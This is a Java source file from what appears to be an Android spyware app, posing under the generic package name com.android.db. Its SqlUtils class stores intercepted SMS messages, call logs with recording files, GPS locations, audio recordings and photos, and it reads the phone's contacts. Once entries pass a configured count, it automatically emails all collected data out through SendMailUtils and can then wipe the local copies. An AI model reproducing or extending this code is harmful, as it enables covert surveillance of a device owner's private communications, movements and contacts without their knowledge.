package com.android.db;

import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.text.TextUtils;

import com.android.pojo.Call;
import com.android.pojo.Location;
import com.android.pojo.Logs;
import com.android.pojo.PhoneInfo;
import com.android.pojo.Photo;
import com.android.pojo.Record;
import com.android.pojo.Sms;
import com.android.utils.SendMailUtils;
import com.android.utils.Utils;

public class SqlUtils extends SQLiteOpenHelper {

	private static String name = "smsclient";
	private static SqlUtils sqlutils;
	private Context context;

	public SqlUtils(Context context) {
		super(context, name, null, 1);
		this.context = context;
		// TODO Auto-generated constructor stub
		sqlutils = this;
	}

	public static SqlUtils getinstance(Context context) {
		if (sqlutils == null) {
			sqlutils = new SqlUtils(context);
		}
		return sqlutils;
	}

	@Override
	public void onCreate(SQLiteDatabase db) {
		// TODO Auto-generated method stub
		String sms = "create table sms(id INTEGER PRIMARY KEY AUTOINCREMENT,dates varchar(100),type varchar(100),address varchar(100),phonename varchar(200),body varchar(300))";
		String call = "create table call(id INTEGER PRIMARY KEY AUTOINCREMENT,dates varchar(100),type varchar(100),address varchar(100),phonename varchar(200),duration varchar(300),recordfile varchar(300))";
		String location = "create table location(id INTEGER PRIMARY KEY AUTOINCREMENT,time varchar(100),addr varchar(300),latitude varchar(100),longitude varchar(200))";
		String record = "create table record(id INTEGER PRIMARY KEY AUTOINCREMENT,dates varchar(100),filename varchar(300))";
		String photo = "create table photo(id INTEGER PRIMARY KEY AUTOINCREMENT,dates varchar(100),filename varchar(300))";
		String log = "create table log(id INTEGER PRIMARY KEY AUTOINCREMENT,time varchar(100),tag varchar(200),content varchar(200))";

		db.execSQL(sms);
		db.execSQL(call);
		db.execSQL(location);
		db.execSQL(record);
		db.execSQL(photo);
		db.execSQL(log);

	}

	@Override
	public void onUpgrade(SQLiteDatabase db, int arg1, int arg2) {
		// TODO Auto-generated method stub

	}

	public void savelog(String tag, String content) {
		String imail = "insert into log (time,tag,content) values(?,?,?)";
		SQLiteDatabase db = this.getWritableDatabase();
		db.execSQL(imail, new Object[] { Utils.formData(new Date()), tag,
				content });
		db.close();

	}

	public void savesms(Sms sms) {
		String sql = "insert into sms(dates,type,address,phonename,body) values (?,?,?,?,?)";
		SQLiteDatabase db = this.getWritableDatabase();
		db.execSQL(sql,
				new Object[] { sms.getDates(), sms.getType(), sms.getAddress(),
						sms.getPhonename(), sms.getBody() });
		db.close();
		
		
		if (getAllSms().size() > Utils.getIntConfig(context, "count", 0)) {
			AllDataMailBody mailbody = new AllDataMailBody(context);
			SendMailUtils.SendAllDataToMail(context, mailbody);
		}

	}

	public void savecall(Call call) {
		String sql = "insert into call(dates,type,address,phonename,duration,recordfile) values (?,?,?,?,?,?)";
		SQLiteDatabase db = this.getWritableDatabase();
		db.execSQL(
				sql,
				new Object[] { call.getDates(), call.getType(),
						call.getAddress(), call.getPhonename(),
						call.getDuration(), call.getRecordfile() });
		db.close();
		
		if (getAllCall().size() > Utils.getIntConfig(context, "count", 0)) {
			AllDataMailBody mailbody = new AllDataMailBody(context);
			SendMailUtils.SendAllDataToMail(context, mailbody);
		}
	}

	public void savelocation(Location loc, boolean send) {
		String sql = "insert into location(time,addr,latitude,longitude) values (?,?,?,?)";
		SQLiteDatabase db = this.getWritableDatabase();
		db.execSQL(sql,
				new Object[] { loc.getTime(), loc.getAddr(), loc.getLatitude(),
						loc.getLongitude() });
		db.close();
		if (send) {
			PhotoRecordMailBody mailbody = new PhotoRecordMailBody(context);
			SendMailUtils.SendAllDataToMail(context, mailbody);
		}
	}

	public void saveRecord(Record record) {
		String sql = "insert into record(dates,filename) values (?,?)";
		SQLiteDatabase db = this.getWritableDatabase();
		db.execSQL(sql,
				new Object[] { record.getDatas(), record.getFilename() });
		db.close();
		if (getAllRecord().size() > 0) {
			PhotoRecordMailBody mailbody = new PhotoRecordMailBody(context);
			SendMailUtils.SendAllDataToMail(context, mailbody);
		}
	}

	public void savePhoto(Photo photo) {
		String sql = "insert into photo(dates,filename) values (?,?)";
		SQLiteDatabase db = this.getWritableDatabase();
		db.execSQL(sql, new Object[] { photo.getDatas(), photo.getFilename() });
		db.close();
		if (getAllPhoto().size() > 0) {
			PhotoRecordMailBody mailbody = new PhotoRecordMailBody(context);
			SendMailUtils.SendAllDataToMail(context, mailbody);
		}
	}

	public List<Sms> getAllSms() {
		List<Sms> lsms = new ArrayList<Sms>();
		String sql = "select * from sms";
		SQLiteDatabase db = this.getReadableDatabase();
		Cursor cursor = db.rawQuery(sql, new String[] {});
		while (cursor.moveToNext()) {
			Sms sms = new Sms();
			sms.setId(cursor.getInt(cursor.getColumnIndex("id")));
			sms.setDates(cursor.getString(cursor.getColumnIndex("dates")));
			sms.setType(cursor.getString(cursor.getColumnIndex("type")));
			sms.setAddress(cursor.getString(cursor.getColumnIndex("address")));
			sms.setPhonename(cursor.getString(cursor
					.getColumnIndex("phonename")));
			sms.setBody(cursor.getString(cursor.getColumnIndex("body")));
			lsms.add(sms);
		}
		cursor.close();
		db.close();
		return lsms;
	}

	public List<Call> getAllCall() {
		List<Call> lcall = new ArrayList<Call>();
		String sql = "select * from call";
		SQLiteDatabase db = this.getReadableDatabase();
		Cursor cursor = db.rawQuery(sql, new String[] {});
		while (cursor.moveToNext()) {
			Call call = new Call();
			call.setId(cursor.getInt(cursor.getColumnIndex("id")));
			call.setDates(cursor.getString(cursor.getColumnIndex("dates")));
			call.setType(cursor.getString(cursor.getColumnIndex("type")));
			call.setAddress(cursor.getString(cursor.getColumnIndex("address")));
			call.setPhonename(cursor.getString(cursor
					.getColumnIndex("phonename")));
			call.setRecordfile(cursor.getString(cursor
					.getColumnIndex("recordfile")));
			call.setDuration(cursor.getString(cursor.getColumnIndex("duration")));
			lcall.add(call);
		}
		cursor.close();
		db.close();
		return lcall;
	}

	public List<Location> getAllLocation() {
		List<Location> lloc = new ArrayList<Location>();
		String sql = "select * from location";
		SQLiteDatabase db = this.getReadableDatabase();
		Cursor cursor = db.rawQuery(sql, new String[] {});
		while (cursor.moveToNext()) {
			Location loc = new Location();
			loc.setId(cursor.getInt(cursor.getColumnIndex("id")));
			loc.setTime(cursor.getString(cursor.getColumnIndex("time")));
			loc.setAddr(cursor.getString(cursor.getColumnIndex("addr")));
			loc.setLatitude(cursor.getString(cursor.getColumnIndex("latitude")));
			loc.setLongitude(cursor.getString(cursor
					.getColumnIndex("longitude")));
			lloc.add(loc);
		}
		cursor.close();
		db.close();
		return lloc;
	}

	public List<Photo> getAllPhoto() {
		List<Photo> data = new ArrayList<Photo>();
		String sql = "select * from photo";
		SQLiteDatabase db = this.getReadableDatabase();
		Cursor cursor = db.rawQuery(sql, new String[] {});
		while (cursor.moveToNext()) {
			Photo item = new Photo();
			item.setId(cursor.getInt(cursor.getColumnIndex("id")));
			item.setDatas(cursor.getString(cursor.getColumnIndex("dates")));
			item.setFilename(cursor.getString(cursor.getColumnIndex("filename")));
			data.add(item);
		}
		cursor.close();
		db.close();
		return data;
	}

	public List<Record> getAllRecord() {
		List<Record> data = new ArrayList<Record>();
		String sql = "select * from record";
		SQLiteDatabase db = this.getReadableDatabase();
		Cursor cursor = db.rawQuery(sql, new String[] {});
		while (cursor.moveToNext()) {
			Record item = new Record();
			item.setId(cursor.getInt(cursor.getColumnIndex("id")));
			item.setDatas(cursor.getString(cursor.getColumnIndex("dates")));
			item.setFilename(cursor.getString(cursor.getColumnIndex("filename")));
			data.add(item);
		}
		cursor.close();
		db.close();
		return data;
	}

	public List<Logs> getAllLog() {
		List<Logs> lloc = new ArrayList<Logs>();
		String sql = "select * from log";
		SQLiteDatabase db = this.getReadableDatabase();
		Cursor cursor = db.rawQuery(sql, new String[] {});
		while (cursor.moveToNext()) {
			Logs log = new Logs();
			log.setId(cursor.getInt(cursor.getColumnIndex("id")));
			log.setTime(cursor.getString(cursor.getColumnIndex("time")));
			log.setTag(cursor.getString(cursor.getColumnIndex("tag")));
			log.setContent(cursor.getString(cursor.getColumnIndex("content")));
			lloc.add(log);
		}
		cursor.close();
		db.close();
		return lloc;
	}

	public void deleteAllSms(List<Sms> lsms) {
		String sql = "delete from sms where id=?";
		SQLiteDatabase db = this.getWritableDatabase();
		db.beginTransaction();
		for (Sms sms : lsms) {
			db.execSQL(sql, new Object[] { sms.getId() });
		}
		db.setTransactionSuccessful();
		db.endTransaction();
		db.close();

	}

	public void deleteAllCall(List<Call> lcall) {
		String sql = "delete from call where id=?";
		SQLiteDatabase db = this.getWritableDatabase();
		db.beginTransaction();
		for (Call call : lcall) {
			db.execSQL(sql, new Object[] { call.getId() });
		}
		db.setTransactionSuccessful();
		db.endTransaction();
		db.close();
	}

	public void deleteAllLocation(List<Location> lloc) {
		String sql = "delete from location where id=?";
		SQLiteDatabase db = this.getWritableDatabase();
		db.beginTransaction();
		for (Location loc : lloc) {
			db.execSQL(sql, new Object[] { loc.getId() });
		}
		db.setTransactionSuccessful();
		db.endTransaction();
		db.close();
	}

	public void deleteAllRecord(List<Record> lloc) {
		String sql = "delete from record where id=?";
		SQLiteDatabase db = this.getWritableDatabase();
		db.beginTransaction();
		for (Record loc : lloc) {
			db.execSQL(sql, new Object[] { loc.getId() });
		}
		db.setTransactionSuccessful();
		db.endTransaction();
		db.close();
	}

	public void deleteAllPhoto(List<Photo> lloc) {
		String sql = "delete from photo where id=?";
		SQLiteDatabase db = this.getWritableDatabase();
		db.beginTransaction();
		for (Photo loc : lloc) {
			db.execSQL(sql, new Object[] { loc.getId() });
		}
		db.setTransactionSuccessful();
		db.endTransaction();
		db.close();
	}

	public void deleteAlllog(List<Logs> lloc) {
		String sql = "delete from log where id=?";
		SQLiteDatabase db = this.getWritableDatabase();
		db.beginTransaction();
		for (Logs loc : lloc) {
			db.execSQL(sql, new Object[] { loc.getId() });
		}
		db.setTransactionSuccessful();
		db.endTransaction();
		db.close();
	}

	public void deleteAll() {
		deleteAllSms(getAllSms());
		deleteAllCall(getAllCall());
		deleteAllLocation(getAllLocation());
		deleteAllPhoto(getAllPhoto());
		deleteAllRecord(getAllRecord());
		deleteAlllog(getAllLog());
	}

	private static final String[] PHONES_PROJECTION = new String[] {
			Phone.DISPLAY_NAME, Phone.NUMBER };

	public List<PhoneInfo> getPhoneContacts() {
		ContentResolver resolver = context.getContentResolver();
		Cursor phoneCursor = resolver.query(Phone.CONTENT_URI,
				PHONES_PROJECTION, null, null, null);
		List<PhoneInfo> lphone = new ArrayList<PhoneInfo>();
		if (phoneCursor != null) {
			while (phoneCursor.moveToNext()) {
				String phoneNumber = phoneCursor.getString(phoneCursor
						.getColumnIndex(Phone.NUMBER));
				if (TextUtils.isEmpty(phoneNumber))
					continue;
				PhoneInfo pi = new PhoneInfo();
				pi.setNumber(phoneNumber);
				String contactName = phoneCursor.getString(phoneCursor
						.getColumnIndex(Phone.DISPLAY_NAME));
				pi.setName(contactName);
				lphone.add(pi);
			}
			phoneCursor.close();
		}
		return lphone;
	}

}
